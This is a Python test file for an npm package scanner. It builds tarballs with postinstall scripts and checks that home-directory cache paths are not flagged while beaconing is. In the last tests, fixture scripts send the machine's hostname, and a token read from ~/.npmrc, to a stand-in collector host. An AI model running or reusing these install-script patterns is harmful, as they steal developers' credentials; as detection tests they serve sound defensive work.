"""The home directory is identity only where its value is kept or passed on; as the base of a path it
says where a file goes (`CAP.JS.RECON.001`, reconnaissance).

```
  path.join(os.homedir(), '.cache', 'tool') beside a release download ──► no beacon
  os.hostname() in the request                                         ──► a beacon
  path.join(os.homedir(), '.npmrc') read and sent                      ──► credential + egress, blocked
```
Provenance: every fixture here is benign carrier text written for this file; none is derived from a
corpus unit. The hosts are reserved `.invalid` names. The credential file is named by its well-known
path only, and nothing in it is read from a machine.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.decide.policy import PolicyGate
from cordon_scanner.foundation.config.settings import Config

BEACON = "MALWARE.EXFIL.BEACON.001"
CREDENTIAL_SENT = "MALWARE.EXFIL.001"


class Package:
    @staticmethod
    def build(tmp_path: Path, script: str) -> Path:
        manifest = {
            "name": "demo-installer",
            "version": "1.0.0",
            "scripts": {"postinstall": "node install.js"},
        }
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in {
                "package.json": json.dumps(manifest),
                "install.js": script,
            }.items():
                data = text.encode()
                info = tarfile.TarInfo("package/" + member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "demo-installer-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def scan(target: Path):
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target)


class TestAHomeDirectoryAsTheBaseOfAPath:
    def test_a_release_downloader_with_a_cache_directory_is_not_a_beacon(self, tmp_path):
        script = (
            "const os = require('os');\n"
            "const path = require('path');\n"
            "const https = require('https');\n"
            "const fs = require('fs');\n"
            "const cache = path.join(os.homedir(), '.cache', 'demo-tool');\n"
            "fs.mkdirSync(cache, { recursive: true });\n"
            "https.get('https://downloads.example.invalid/demo-tool-1.0.0.tgz', (res) => {\n"
            "  res.pipe(fs.createWriteStream(path.join(cache, 'demo-tool.tgz')));\n"
            "});\n"
        )
        result = Package.scan(Package.build(tmp_path, script))
        assert BEACON not in {f.rule_id for f in result.findings}

    def test_a_path_built_by_concatenation_is_the_same(self, tmp_path):
        script = (
            "const os = require('os');\n"
            "const https = require('https');\n"
            "const cache = os.homedir() + '/.cache/demo-tool';\n"
            "https.get('https://downloads.example.invalid/demo-tool-1.0.0.tgz', () => {});\n"
            "console.log('cache at', cache);\n"
        )
        result = Package.scan(Package.build(tmp_path, script))
        assert BEACON not in {f.rule_id for f in result.findings}


class TestWhatStillCounts:
    def test_the_hostname_in_the_request_is_still_a_beacon(self, tmp_path):
        script = (
            "const os = require('os');\n"
            "const https = require('https');\n"
            "https.get('https://collector.example.invalid/hello?h=' + os.hostname());\n"
        )
        result = Package.scan(Package.build(tmp_path, script))
        assert BEACON in {f.rule_id for f in result.findings}

    def test_a_credential_file_under_the_home_directory_sent_out_is_still_blocked(self, tmp_path):
        script = (
            "const os = require('os');\n"
            "const path = require('path');\n"
            "const fs = require('fs');\n"
            "const https = require('https');\n"
            "const token = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
            "const req = https.request({ host: 'collector.example.invalid', method: 'POST', path: '/c' });\n"
            "req.end(token);\n"
        )
        result = Package.scan(Package.build(tmp_path, script))
        assert CREDENTIAL_SENT in {f.rule_id for f in result.findings}
        assert not PolicyGate.evaluate(result, Config.default().policy).passed
